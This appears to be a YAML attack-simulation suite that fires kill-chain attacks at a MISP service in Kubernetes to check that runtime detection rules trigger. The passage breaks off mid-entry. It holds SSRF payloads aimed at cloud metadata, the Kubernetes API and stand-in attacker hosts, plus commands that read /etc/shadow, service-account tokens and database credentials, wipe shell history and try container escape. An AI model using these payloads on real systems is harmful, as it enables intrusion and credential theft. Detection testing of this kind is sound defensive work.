apiVersion: bobctl.k8sstormcenter.io/v1alpha1
kind: AttackSuite
metadata:
  name: misp-killchain-attacks
  description: >-
    Kill-chain ordered MISP attack suite (57 attacks) using THREE delivery
    mechanisms: MISP REST API abuse (authenticated), HTTP probes (unauthenticated),
    and kubectl exec post-exploitation. Includes CVE-based exploits: CVE-2020-28043
    (SSRF), CVE-2022-29529 (XSS), CVE-2022-47928 (priv esc), CVE-2023-37307,
    CVE-2024-29859. Covers OWASP A01 (Broken Access Control), A03 (Injection/
    SQLi/LFI), A05 (Misconfiguration), A07 (Auth Failures), A10 (SSRF).
target:
  service: misp
  namespace: misp
  port: 443
  protocol: https

attacks:
  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 1: RECONNAISSANCE (TA0043) — API enumeration
  # ═══════════════════════════════════════════════════════════════════════════

  # T1190 — Exploit Public-Facing Application (create malicious event with IoC attributes)
  - name: api-create-malicious-event
    type: ssrf
    http:
      method: POST
      path: /events/add
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "Event": {
            "info": "BOB Attack - Malicious Event with IoC Attributes",
            "distribution": "0",
            "threat_level_id": "1",
            "analysis": "2",
            "Attribute": [
              {
                "type": "ip-dst",
                "category": "Network activity",
                "value": "10.0.0.1",
                "to_ids": true,
                "comment": "Internal k8s service IP probe"
              },
              {
                "type": "url",
                "category": "Network activity",
                "value": "http://kubernetes.default.svc:443/api/v1/namespaces",
                "to_ids": true,
                "comment": "K8s API server URL"
              },
              {
                "type": "domain",
                "category": "Network activity",
                "value": "evil-c2.attacker.example.com",
                "to_ids": true,
                "comment": "C2 domain for correlation"
              },
              {
                "type": "filename|sha256",
                "category": "Payload delivery",
                "value": "malware.exe|e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                "to_ids": true
              }
            ]
          }
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0002
        ruleName: Unexpected file access
        containerName: misp

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 2: INITIAL ACCESS (TA0001) — SSRF via feed manipulation
  # ═══════════════════════════════════════════════════════════════════════════

  # T1190 — Exploit Public-Facing Application (SSRF to k8s API)
  - name: api-ssrf-feed-k8s-api
    type: ssrf
    http:
      method: POST
      path: /feeds/add
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "Feed": {
            "name": "BOB-SSRF-k8s-api",
            "provider": "attacker",
            "url": "https://kubernetes.default.svc:443/api/v1/namespaces",
            "source_format": "freetext",
            "enabled": true,
            "input_source": "network",
            "publish": false,
            "override_ids": false,
            "distribution": "0"
          }
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0005
        ruleName: Unexpected domain request
        containerName: misp

  # T1552.005 — Cloud Instance Metadata API
  - name: api-ssrf-feed-cloud-metadata
    type: ssrf
    http:
      method: POST
      path: /feeds/add
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "Feed": {
            "name": "BOB-SSRF-cloud-metadata",
            "provider": "attacker",
            "url": "http://169.254.169.254/latest/meta-data/",
            "source_format": "freetext",
            "enabled": true,
            "input_source": "network",
            "publish": false,
            "distribution": "0"
          }
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0005
        ruleName: Unexpected domain request
        containerName: misp

  # T1190 — SSRF to attacker-controlled C2 domain
  - name: api-ssrf-feed-c2-domain
    type: ssrf
    http:
      method: POST
      path: /feeds/add
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "Feed": {
            "name": "BOB-SSRF-c2-exfil",
            "provider": "attacker",
            "url": "https://evil-c2.attacker.example.com/feed/manifest.json",
            "source_format": "misp",
            "enabled": true,
            "input_source": "network",
            "publish": false,
            "distribution": "0"
          }
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0005
        ruleName: Unexpected domain request
        containerName: misp

  # T1190 — Trigger feed fetch (causes outbound connection)
  - name: api-fetch-malicious-feed
    type: ssrf
    http:
      method: POST
      path: /feeds/fetchFromAllFeeds
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: "{}"
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0005
        ruleName: Unexpected domain request
        containerName: misp
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp

  # T1190 — SSRF unauthenticated (cloud metadata via preview)
  - name: ssrf-cloud-metadata
    type: ssrf
    http:
      method: POST
      path: /feeds/previewIndex
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: "data%5BFeed%5D%5Burl%5D=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
    successIndicators:
      - statusCode: 200
    expectedDetections: []

  # T1190 — SSRF unauthenticated (k8s API via preview)
  - name: ssrf-internal-k8s-api
    type: ssrf
    http:
      method: POST
      path: /feeds/previewIndex
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: "data%5BFeed%5D%5Burl%5D=http%3A%2F%2Fkubernetes.default.svc%2Fapis"
    successIndicators:
      - statusCode: 200
    expectedDetections: []

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 3: EXECUTION (TA0002) — Code execution via API and exec
  # ═══════════════════════════════════════════════════════════════════════════

  # T1059 — STIX import (triggers parser subprocess)
  - name: api-stix-import-abuse
    type: ssrf
    http:
      method: POST
      path: /events/upload_stix/2
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "type": "bundle",
          "id": "bundle--bob-attack-001",
          "spec_version": "2.1",
          "objects": [
            {
              "type": "indicator",
              "id": "indicator--bob-001",
              "created": "2026-01-01T00:00:00Z",
              "modified": "2026-01-01T00:00:00Z",
              "spec_version": "2.1",
              "name": "BOB STIX Import Attack",
              "pattern": "[ipv4-addr:value = '10.0.0.0/8' OR ipv4-addr:value = '172.16.0.0/12' OR ipv4-addr:value = '192.168.0.0/16' OR domain-name:value LIKE '%kubernetes.default.svc%']",
              "pattern_type": "stix",
              "valid_from": "2026-01-01T00:00:00Z",
              "indicator_types": ["malicious-activity"]
            },
            {
              "type": "malware",
              "id": "malware--bob-001",
              "created": "2026-01-01T00:00:00Z",
              "modified": "2026-01-01T00:00:00Z",
              "spec_version": "2.1",
              "name": "BOB Test Malware with long description for parser stress",
              "is_family": false,
              "malware_types": ["ransomware"]
            },
            {
              "type": "relationship",
              "id": "relationship--bob-001",
              "created": "2026-01-01T00:00:00Z",
              "modified": "2026-01-01T00:00:00Z",
              "spec_version": "2.1",
              "relationship_type": "indicates",
              "source_ref": "indicator--bob-001",
              "target_ref": "malware--bob-001"
            }
          ]
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp

  # T1059.004 — Unix Shell (whoami)
  - name: exec-whoami
    type: cmdinject
    exec:
      command: ["whoami"]
    successIndicators:
      - responseContains: "root"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp
        command: whoami

  # T1059.004 — Unix Shell (id)
  - name: exec-id
    type: cmdinject
    exec:
      command: ["id"]
    successIndicators:
      - responseContains: "uid="
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp
        command: id

  # T1059.004 — Unix Shell (exec from /dev/shm)
  - name: exec-from-devshm
    type: cmdinject
    exec:
      command: ["sh", "-c", "cp /bin/echo /dev/shm/malicious && /dev/shm/malicious pwned 2>&1; rm -f /dev/shm/malicious"]
    successIndicators:
      - responseContains: "pwned"
    expectedDetections:
      - ruleID: R1000
        ruleName: Exec from malicious source
        containerName: misp

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 4: PERSISTENCE (TA0003) — Config manipulation
  # ═══════════════════════════════════════════════════════════════════════════

  # T1098 — Account Manipulation (server sync for persistence)
  - name: api-server-sync-ssrf
    type: ssrf
    http:
      method: POST
      path: /servers/add
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "Server": {
            "name": "BOB-Rogue-MISP-Sync",
            "url": "https://rogue-misp.attacker.example.com",
            "authkey": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "push": false,
            "pull": true,
            "remote_org_id": 1,
            "organisation_type": "local"
          }
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0005
        ruleName: Unexpected domain request
        containerName: misp

  # T1098 — Trigger server pull (outbound to rogue)
  # Server ID 1 is the built-in default server. The pull attempt triggers
  # MISP to resolve the server URL, generating outbound DNS/HTTP traffic.
  - name: api-trigger-server-pull
    type: ssrf
    http:
      method: POST
      path: /servers/pull/1
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "technique": "full"
        }
    successIndicators:
      - statusCode: 200
      - statusCode: 403
      - statusCode: 404
    expectedDetections:
      - ruleID: R0005
        ruleName: Unexpected domain request
        containerName: misp
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp

  # T1098 — API key enumeration via cake console (read-only, does not rotate keys)
  - name: exec-cake-extract-apikey
    type: cmdinject
    exec:
      command: ["sh", "-c", "/var/www/MISP/app/Console/cake Admin getAuthkey 1 2>/dev/null; echo apikey_attempted"]
    successIndicators:
      - responseContains: "apikey_attempted"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 5: PRIVILEGE ESCALATION (TA0004) — Container escape attempts
  # ═══════════════════════════════════════════════════════════════════════════

  # T1611 — Escape to Host (unshare namespace escape attempt)
  - name: exec-unshare
    type: cmdinject
    exec:
      command: ["sh", "-c", "unshare -r id 2>&1 || echo unshare_blocked"]
    successIndicators:
      - responseContains: "unshare_blocked"
    expectedDetections:
      - ruleID: R1006
        ruleName: Process tries to escape container
        containerName: misp

  # T1055 — Process Injection (ptrace attempt)
  - name: exec-ptrace
    type: cmdinject
    exec:
      command: ["sh", "-c", "strace -p 1 -e trace=open -c 2>&1 | head -5 || echo ptrace_blocked"]
    successIndicators:
      - responseContains: "ptrace_blocked"
    expectedDetections:
      - ruleID: R1015
        ruleName: Ptrace Detected
        containerName: misp

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 6: DEFENSE EVASION (TA0005) — Cover tracks
  # ═══════════════════════════════════════════════════════════════════════════

  # T1036 — Masquerading: drifted binary
  - name: exec-drifted-binary
    type: cmdinject
    exec:
      command: ["sh", "-c", "cp /bin/ls /tmp/drifted_misp && /tmp/drifted_misp /etc 2>&1; rm -f /tmp/drifted_misp"]
    successIndicators:
      - responseContains: "passwd"
    expectedDetections:
      - ruleID: R1001
        ruleName: Exec Binary Not In Base Image
        containerName: misp

  # T1574.006 — LD_PRELOAD hijacking
  - name: exec-ld-preload
    type: cmdinject
    exec:
      command: ["sh", "-c", "LD_PRELOAD=/tmp/evil.so ls / 2>&1 || echo ld_preload_attempted"]
    successIndicators:
      - responseContains: "ld_preload_attempted"
    expectedDetections:
      - ruleID: R1011
        ruleName: LD Preload Hook
        containerName: misp

  # T1070.004 — Indicator Removal: clear history
  - name: exec-history-wipe
    type: cmdinject
    exec:
      command: ["sh", "-c", "rm -f /root/.bash_history /home/*/.bash_history 2>/dev/null; echo wiped"]
    successIndicators:
      - responseContains: "wiped"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp
        command: rm

  # T1562 — Impair Defenses: disable warninglists
  - name: api-warninglist-poison
    type: ssrf
    http:
      method: POST
      path: /warninglists/toggleEnable
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "Warninglist": {
            "data": "1"
          }
        }
    successIndicators:
      - statusCode: 200
      - statusCode: 403
    expectedDetections:
      - ruleID: R0002
        ruleName: Unexpected file access
        containerName: misp

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 7: CREDENTIAL ACCESS (TA0006) — Steal secrets
  # ═══════════════════════════════════════════════════════════════════════════

  # T1552.001 — Credentials in Files: SA token
  - name: exec-sa-token
    type: cmdinject
    exec:
      command: ["cat", "/var/run/secrets/kubernetes.io/serviceaccount/token"]
    successIndicators:
      - responseContains: "eyJ"
    expectedDetections:
      - ruleID: R0006
        ruleName: Unexpected Service Account Token Access
        containerName: misp
        command: cat

  # T1552.001 — Credentials in Files: /etc/shadow
  - name: exec-read-shadow
    type: cmdinject
    exec:
      command: ["cat", "/etc/shadow"]
    successIndicators:
      - responseContains: "root:"
    expectedDetections:
      - ruleID: R0010
        ruleName: Unexpected Sensitive File Access
        containerName: misp
        command: cat

  # T1552.001 — Credentials in Files: /etc/passwd
  - name: exec-read-passwd
    type: cmdinject
    exec:
      command: ["cat", "/etc/passwd"]
    successIndicators:
      - responseContains: "root:"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp
        command: cat

  # T1552.001 — Credentials in Files: database config
  - name: exec-read-db-config
    type: cmdinject
    exec:
      command: ["cat", "/var/www/MISP/app/Config/database.php"]
    successIndicators:
      - responseContains: "datasource"
    expectedDetections:
      - ruleID: R0010
        ruleName: Unexpected Sensitive File Access
        containerName: misp
        command: cat

  # T1552.001 — Credentials in Files: Valkey/Redis creds
  - name: exec-read-valkey-creds
    type: cmdinject
    exec:
      command: ["sh", "-c", "grep -r 'redis_password\\|redis_host\\|SimpleBackgroundJobs' /var/www/MISP/app/Config/ 2>/dev/null | head -10 || echo no_redis_config"]
    successIndicators:
      - responseContains: "redis"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp
        command: grep
      - ruleID: R0010
        ruleName: Unexpected Sensitive File Access
        containerName: misp

  # T1552 — Symlink over sensitive file
  - name: exec-symlink-shadow
    type: cmdinject
    exec:
      command: ["sh", "-c", "ln -sf /etc/shadow /tmp/shadow_link 2>&1 && cat /tmp/shadow_link 2>/dev/null; rm -f /tmp/shadow_link"]
    successIndicators:
      - responseContains: "root:"
    expectedDetections:
      - ruleID: R1010
        ruleName: Symlink Created Over Sensitive File
        containerName: misp

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 8: DISCOVERY (TA0007) — Environment enumeration
  # ═══════════════════════════════════════════════════════════════════════════

  # T1082 — System Information Discovery: /proc/environ
  - name: exec-read-environ
    type: cmdinject
    exec:
      command: ["sh", "-c", "cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -3 || echo no_environ"]
    successIndicators:
      - responseContains: "="
    expectedDetections:
      - ruleID: R0008
        ruleName: Read Environment Variables from procfs
        containerName: misp
        command: cat

  # T1057 — Process Discovery: enumerate workers
  - name: exec-enumerate-workers
    type: cmdinject
    exec:
      command: ["sh", "-c", "supervisorctl status 2>/dev/null; ps aux | grep -E 'cake|php|worker' | head -10"]
    successIndicators:
      - responseContains: "misp"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp
        command: ps

  # T1046 — Network Service Discovery: resolv.conf and hosts
  - name: exec-net-recon
    type: cmdinject
    exec:
      command: ["sh", "-c", "cat /etc/resolv.conf && cat /etc/hosts"]
    successIndicators:
      - responseContains: "nameserver"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp
        command: cat

  # T1613 — Container and Resource Discovery: K8s API curl
  - name: exec-k8s-api-curl
    type: cmdinject
    exec:
      command: ["sh", "-c", "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) && curl -sk -H \"Authorization: Bearer $TOKEN\" https://kubernetes.default.svc/api 2>&1 | head -5 || echo k8s_failed"]
    successIndicators:
      - responseContains: "kind"
    expectedDetections:
      - ruleID: R0005
        ruleName: Unexpected domain request
        containerName: misp
      - ruleID: R0007
        ruleName: Kubernetes Client Executed
        containerName: misp

  # T1059 — MISP-specific: cake admin dump
  - name: exec-cake-admin-dump
    type: cmdinject
    exec:
      command: ["sh", "-c", "/var/www/MISP/app/Console/cake Admin getSetting MISP 2>/dev/null | head -20 || echo cake_done"]
    successIndicators:
      - responseContains: "MISP"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 9: LATERAL MOVEMENT (TA0008) — SSH and server sync
  # ═══════════════════════════════════════════════════════════════════════════

  # T1021.004 — Remote Services: SSH attempt
  - name: exec-ssh-attempt
    type: cmdinject
    exec:
      command: ["sh", "-c", "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@127.0.0.1 id 2>&1 || echo ssh_failed"]
    successIndicators:
      - responseContains: "ssh_failed"
    expectedDetections:
      - ruleID: R1003
        ruleName: SSH Connection
        containerName: misp

  # ═══════════════════════════════════════════════════════════════════════════
  # Phase 10: COLLECTION (TA0009) — Data staging and harvesting
  # ═══════════════════════════════════════════════════════════════════════════

  # T1005 — Data from Local System (find config files)
  - name: exec-data-stage
    type: cmdinject
    exec:
      command: ["sh", "-c", "find /var/www/MISP -name '*.php' -path '*Config*' 2>/dev/null | head -10"]
    successIndicators:
      - responseContains: "Config"
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp
        command: find

  # T1005 — Data from Local System (bulk CSV export)
  - name: api-bulk-export-csv
    type: ssrf
    http:
      method: POST
      path: /events/csv/download
      headers:
        Content-Type: application/json
        Accept: text/csv
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "request": {
            "type": "ip-dst",
            "includeContext": true
          }
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0002
        ruleName: Unexpected file access
        containerName: misp

  # T1005 — Data from Local System (STIX export)
  - name: api-export-stix
    type: ssrf
    http:
      method: POST
      path: /events/restSearch
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "returnFormat": "stix2",
          "limit": "100",
          "includeDecayScore": true
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0001
        ruleName: Unexpected process launched
        containerName: misp

  # T1565 — Data Manipulation: upload malicious attachment
  - name: api-upload-malicious-attachment
    type: ssrf
    http:
      method: POST
      path: /events/add
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "Event": {
            "info": "BOB Attack - Malicious Attachment Upload",
            "distribution": "0",
            "threat_level_id": "1",
            "analysis": "0",
            "Attribute": [
              {
                "type": "attachment",
                "category": "Payload delivery",
                "value": "malware_sample.exe",
                "data": "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0K",
                "comment": "BOB test PE header attachment",
                "to_ids": false
              }
            ]
          }
        }
    successIndicators:
      - statusCode: 200
    expectedDetections:
      - ruleID: R0002
        ruleName: Unexpected file access
        containerName: misp

  # T1565 — Data Manipulation: galaxy cluster poisoning
  - name: api-galaxy-cluster-poison
    type: ssrf
    http:
      method: POST
      path: /galaxy_clusters/add/1
      headers:
        Content-Type: application/json
        Accept: application/json
        Authorization: "__MISP_API_KEY__"
      body: >-
        {
          "GalaxyCluster": {
            "value": "BOB-Poisoned-Threat-Actor",
            "description": "This is a poisoned galaxy cluster injected by attack simulation to test detection of threat intel tampering",
            "distribution": "3",
            "source": "attacker-controlled",
            "authors": ["bob-attack-simulation"],
            "GalaxyElement": [
              {
                "key": "country",
                "value": "XX"
              },
              {
                "key": "synonyms",
                "value": "APT-Fake"
              }
            ]
